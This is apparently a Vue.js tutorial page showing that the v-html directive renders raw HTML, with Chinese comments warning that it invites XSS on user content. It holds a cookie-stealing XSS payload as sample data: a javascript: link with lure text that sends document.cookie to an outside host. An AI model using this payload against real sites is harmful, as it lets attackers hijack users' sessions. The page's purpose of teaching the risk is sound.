<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
    <!--       
        v-html指令：
            1.作用: 想指定节点中旬阿然包含html结构的内容
            2.与插值语法的区别:
                a.v-html会替换节点中所有的内容。{{xx}}则不会
                b.v-html可以识别html结构
            3.严重注意：v-html有安全性问题！！！
                a.在网站上动态渲染html是非常危险的，容易导致XSS攻击。
                b.一定要在可信的内容上使用v-html，永远不要在用户提交的内容上使用

    -->

        <div id="root">
            <h3>{{name}}</h3>
            <h3 v-html="addr"></h3>

        </div>
        
    </body>
    <script type="text/javascript">
        Vue.config.productionTip = false
        const vm = new Vue({
            el:"#root",
            data:{
                name:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>来啊 有片看</a>',
                addr:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>来啊 有片看</a>'
            },
            methods:{
                showInfo(){
                    alert("输出第一个method")
                },
            }
        })
    </script>

</html>
